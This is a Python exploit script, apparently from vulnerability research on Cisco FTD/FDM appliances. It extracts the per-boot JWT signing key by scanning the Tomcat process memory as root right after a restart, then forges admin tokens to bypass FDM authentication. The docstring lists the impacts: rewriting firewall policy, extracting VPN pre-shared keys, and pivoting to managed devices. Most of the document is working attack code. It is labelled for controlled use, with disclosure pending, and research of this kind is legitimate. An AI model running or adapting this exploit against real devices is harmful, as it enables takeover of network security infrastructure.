"""
F-FTD-106: FDM JWT Signing Key Extraction via JVM Heap Scan
CONTROLLED ENVIRONMENT ONLY

Affected: Cisco FTD 7.0.0-94 (verified); likely all FTD 7.x / FDM-managed appliances
Depends on: F-FTD-109 (cli_shadow NOPASSWD → root) for /proc/<pid>/mem access

Attack surface:
  FDM generates a random AES-128 key per boot and uses it as the HMAC-SHA256 secret
  for ALL FDM JWT tokens (access + refresh). The key is stored in Neo4j (SerializationKey
  node) and loaded into EncryptionUtil.encryptionKeyCache as a raw byte[16] at JVM startup.

  During class initialization, the key exists in the JVM heap as a Java String (base64,
  24 ASCII chars ending ==). GC collects the String shortly after init (~5-30 seconds).
  After that window, only the raw byte[16] remains — undetectable via base64 pattern scan.

  Exploitation window: scan /proc/<tomcat_pid>/mem immediately after Tomcat restart,
  before GC runs. The key is present as a recoverable base64 String during class init.

Verified:
  - Key class path: com/cisco/ngfw/onbox/rest/auth/util/EncryptionUtil.class
  - Field: static ConcurrentHashMap<String,byte[]> encryptionKeyCache
  - Loading: Neo4j SerializationKey node UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
  - JWT class: com/cisco/ngfw/onbox/rest/auth/FDMJwsToken.class (jjwt library)
  - Oracle: GET https://127.0.0.1/api/fdm/v6/object/users (F-FTD-105 localhost bypass)
    → 200 = valid JWT; 401 = wrong key
  - Required JWT claims (from bytecode analysis):
      iss: "Cisco-FDM", sub: "admin", iat: <epoch_sec>, exp: <epoch_sec + 7200>
      tokenType: "JWT_Access", origin: "password", username: "admin"
      userRole: "ROLE_ADMIN", userUuid: "<admin uuid from /object/users>",
      accessTokenExpiresAt: <epoch_ms + 7200000>

Exploitation chain:
  1. Root via F-FTD-109 (cli_shadow NOPASSWD → crack → sudo -S)
  2. Restart Tomcat (kill -9 <pid>; supervisor auto-restarts)
  3. Wait for new PID (~2s), scan heap immediately (before GC)
  4. Oracle each 16-byte candidate via on-VM curl
  5. Forge JWT with extracted key → any role, any user, indefinite expiry
  6. Full FDM API access: policy modification, credential extraction, ASDM bypass

Impact:
  - Forge admin JWT → bypass FDM authentication entirely
  - Modify firewall rules, NAT, access policies
  - Extract interface configs, routing tables, VPN PSKs
  - Pivot: FTD managing ASA → ASA full compromise
  - Key is per-boot random → persists until next restart (typically weeks)

Timing requirement:
  - Scan must complete before GC runs (~5-30 seconds after Tomcat starts)
  - Three rapid scan waves cover the GC window (waves at t+0s, t+3s, t+6s)
  - WAVE 0 typically catches the key if successful

PSIRT: TBD (coordinate with F-FTD-109 in same submission)
"""

# CONTROLLED ENVIRONMENT ONLY

import subprocess
import socket
import base64
import hashlib
import hmac
import json
import time
import re
import sys
import os


# ============================================================
# Configuration
# ============================================================

FTD_CONSOLE_HOST = '127.0.0.1'
FTD_CONSOLE_PORT = 4070   # serial console telnet (QEMU)
SUDO_PASSWORD    = 'Admin123!'  # cracked via F-FTD-109
ADMIN_UUID       = 'c5a22f41-9c3b-11f1-a1e3-591e15734044'  # from /object/users
FDM_API_BASE     = 'https://127.0.0.1'  # must run ON the FTD VM

BASE64_PATTERN = re.compile(rb'[A-Za-z0-9+/]{22}==')
SCAN_WAVES     = 3     # scan heap N times to cover GC window
WAVE_INTERVAL  = 3     # seconds between waves
MAX_REGION_MB  = 256   # skip heap regions larger than this


# ============================================================
# Console Transport (serial telnet to QEMU VM)
# ============================================================

class FTDConsole:
    """Minimal serial console transport. Admin is already in bash (FTD 7.0.0-94)."""

    def __init__(self, host=FTD_CONSOLE_HOST, port=FTD_CONSOLE_PORT):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        self._drain(2)
        # Reset line
        self.s.send(b'\x03\x15\n')
        time.sleep(1)
        self._drain(2)

    def _strip_iac(self, buf):
        i, out = 0, b''
        while i < len(buf):
            if buf[i] == 0xFF and i + 2 < len(buf):
                i += 3
            else:
                out += bytes([buf[i]])
                i += 1
        return out

    def _drain(self, timeout=3):
        self.s.settimeout(timeout)
        buf = b''
        try:
            while True:
                c = self.s.recv(4096)
                if not c:
                    break
                buf += c
        except Exception:
            pass
        return self._strip_iac(buf).decode('utf-8', errors='replace')

    def run(self, cmd, wait=5):
        self.s.send((cmd + '\n').encode())
        time.sleep(wait)
        return self._drain(wait + 2)

    def close(self):
        self.s.close()


# ============================================================
# Heap Scanner (runs locally via /proc/PID/mem as root)
# ============================================================

def find_tomcat_pid():
    """Find the FDM Tomcat PID (ngfwWebUi java process)."""
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    for line in r.stdout.split('\n'):
        if 'java' in line and 'ngfwWebUi' in line and 'grep' not in line:
            parts = line.split()
            if parts:
                return int(parts[1])
    return None


def scan_heap_for_b64(pid: int) -> dict:
    """
    Scan /proc/<pid>/mem for 24-char base64 strings (AES-128 key candidates).
    Must run as root. Returns {b64str: count} dict.
    """
    candidates = {}
    try:
        with open(f'/proc/{pid}/maps') as f:
            regions = []
            for line in f:
                parts = line.split()
                if len(parts) < 5:
                    continue
                if 'r' not in parts[1]:
                    continue
                name = parts[-1] if len(parts) >= 6 else ''
                if name in ('[vvar]', '[vsyscall]'):
                    continue
                start, end = (int(x, 16) for x in parts[0].split('-'))
                if end - start > MAX_REGION_MB * 1024 * 1024:
                    continue
                regions.append((start, end - start))

        with open(f'/proc/{pid}/mem', 'rb') as mf:
            for start, size in regions:
                mf.seek(start)
                offset = 0
                while offset < size:
                    chunk = min(4 * 1024 * 1024, size - offset)
                    try:
                        data = mf.read(chunk)
                    except Exception:
                        break
                    if not data:
                        break
                    for match in BASE64_PATTERN.finditer(data):
                        v = match.group().decode('ascii', errors='replace')
                        candidates[v] = candidates.get(v, 0) + 1
                    offset += len(data)
    except Exception as ex:
        print(f'[scan_heap] error: {ex}', file=sys.stderr)

    return candidates


# ============================================================
# JWT Forge + Oracle
# ============================================================

def forge_jwt(key_bytes: bytes, role: str = 'ROLE_ADMIN',
              user: str = 'admin', uuid: str = ADMIN_UUID,
              ttl_sec: int = 7200) -> str:
    """
    Forge an FDM JWT token with the extracted key.
    Claims validated by jjwt in FDMJwsToken.java (confirmed via bytecode).
    """
    now = int(time.time())
    header = base64.urlsafe_b64encode(
        json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode()
    ).rstrip(b'=')
    payload = base64.urlsafe_b64encode(json.dumps({
        'iss':                 'Cisco-FDM',
        'sub':                 user,
        'iat':                 now,
        'exp':                 now + ttl_sec,
        'tokenType':           'JWT_Access',
        'origin':              'password',
        'username':            user,
        'userRole':            role,
        'userUuid':            uuid,
        'accessTokenExpiresAt': (now + ttl_sec) * 1000,
    }).encode()).rstrip(b'=')
    msg = header + b'.' + payload
    sig = base64.urlsafe_b64encode(
        hmac.new(key_bytes, msg, hashlib.sha256).digest()
    ).rstrip(b'=')
    return (msg + b'.' + sig).decode()


def jwt_oracle(jwt: str, endpoint: str = '/api/fdm/v6/object/users') -> str:
    """
    Test a JWT via the FDM API. Returns HTTP status code string.
    MUST run on the FTD VM itself (F-FTD-105 localhost bypass required).
    """
    r = subprocess.run(
        ['curl', '-sk', '-o', '/dev/null', '-w', '%{http_code}',
         '-H', f'Authorization: Bearer {jwt}',
         f'{FDM_API_BASE}{endpoint}'],
        capture_output=True, text=True, timeout=8
    )
    return r.stdout.strip()


# ============================================================
# Main Extraction Workflow
# ============================================================

def extract_key(console: FTDConsole = None) -> bytes | None:
    """
    Complete key extraction:
    1. Kill Tomcat via console (supervisor restarts it)
    2. Poll for new PID
    3. Scan heap across multiple GC windows
    4. Oracle each 16-byte candidate
    Returns raw key bytes or None.
    """
    # Step 1: Restart Tomcat cleanly via pmtool (confirmed name: ngfwWebUi)
    if console:
        print('[*] Restarting FDM via pmtool restartbytype ngfwWebUi...')
        console.run('pmtool restartbytype ngfwWebUi 2>&1', wait=5)
    else:
        # Running directly on FTD as root
        pid = find_tomcat_pid()
        if pid:
            print(f'[*] Restarting via pmtool (current PID {pid})...')
            subprocess.run(['pmtool', 'restartbytype', 'ngfwWebUi'],
                           capture_output=True)

    # Step 2: Poll for new PID
    print('[*] Waiting for new Tomcat PID...')
    new_pid = None
    for _ in range(60):
        new_pid = find_tomcat_pid()
        if new_pid:
            break
        time.sleep(1)

    if not new_pid:
        print('[-] Timeout: no new Tomcat PID found')
        return None
    print(f'[+] New PID: {new_pid}')

    # Step 3: Scan heap across GC windows
    # Wave 0: immediately (catches String before first GC)
    # Wave 1-2: t+3s, t+6s (catches delayed GC)
    all_candidates = {}
    for wave in range(SCAN_WAVES):
        print(f'[*] Wave {wave}: scanning heap (PID {new_pid})...')
        found = scan_heap_for_b64(new_pid)
        print(f'    Wave {wave}: {len(found)} candidates')
        all_candidates.update(found)
        if wave < SCAN_WAVES - 1:
            time.sleep(WAVE_INTERVAL)

    print(f'[*] Total unique candidates: {len(all_candidates)}')

    # Step 4: Wait for FDM ready, then oracle
    print('[*] Waiting for FDM HTTP...')
    for _ in range(120):
        r = subprocess.run(
            ['curl', '-sk', '-o', '/dev/null', '-w', '%{http_code}',
             f'{FDM_API_BASE}/api/fdm/v6/object/users'],
            capture_output=True, text=True, timeout=5
        )
        if r.stdout.strip() == '200':
            print('[+] FDM ready')
            break
        time.sleep(3)

    # Sanity check
    sanity = jwt_oracle(forge_jwt(b'\x00' * 16))
    print(f'[*] Sanity (null key): {sanity}')

    # Oracle each candidate (sorted by frequency — higher = more likely real object)
    for v, ct in sorted(all_candidates.items(), key=lambda x: -x[1]):
        try:
            raw = base64.b64decode(v)
        except Exception:
            continue
        if len(raw) != 16:
            continue
        code = jwt_oracle(forge_jwt(raw))
        print(f'[*] {v} (x{ct}): {code}')
        if code == '200':
            print(f'\n[!!!] KEY FOUND: {v}')
            with open('FOUND_KEY.txt', 'w') as f:
                f.write(f'KEY_B64={v}\nKEY_HEX={raw.hex()}\n')
            return raw

    print('[-] Key not found in scan window')
    return None


def demo_forge(key_b64: str, admin_uuid: str = ADMIN_UUID) -> None:
    """Demonstrate JWT forgery with the extracted key."""
    key = base64.b64decode(key_b64)
    print('\n=== F-FTD-106 JWT FORGE DEMO ===')
    for role in ['ROLE_ADMIN', 'ROLE_SYSTEM']:
        jwt = forge_jwt(key, role=role)
        code = jwt_oracle(jwt)
        print(f'  {role}: {code}  JWT={jwt[:60]}...')
    print('================================\n')


# ============================================================
# Ablation Module Entry Point
# ============================================================

def run(target: dict) -> dict:
    """
    Ablation framework entry point.
    target = {'console_host': ..., 'console_port': ..., 'sudo_pass': ..., 'admin_uuid': ...}
    """
    global SUDO_PASSWORD, ADMIN_UUID

    if 'sudo_pass'  in target: SUDO_PASSWORD = target['sudo_pass']
    if 'admin_uuid' in target: ADMIN_UUID    = target['admin_uuid']

    console = None
    if 'console_host' in target:
        console = FTDConsole(target['console_host'], target.get('console_port', 4070))

    try:
        key_bytes = extract_key(console)
        if key_bytes:
            key_b64 = base64.b64encode(key_bytes).decode()
            demo_forge(key_b64, ADMIN_UUID)
            return {'status': 'success', 'key_b64': key_b64, 'key_hex': key_bytes.hex()}
        else:
            return {'status': 'fail', 'reason': 'key_not_in_window'}
    finally:
        if console:
            console.close()


if __name__ == '__main__':
    print('[F-FTD-106] FDM JWT Signing Key Extraction — CONTROLLED ENVIRONMENT ONLY')
    print()

    # If running directly on FTD VM as root:
    key_bytes = extract_key(console=None)
    if key_bytes:
        key_b64 = base64.b64encode(key_bytes).decode()
        demo_forge(key_b64)
    else:
        print('[-] Extraction failed — check timing and GC window')
        print('    Fallback: use jattach for heap dump if tooling available')
        sys.exit(1)
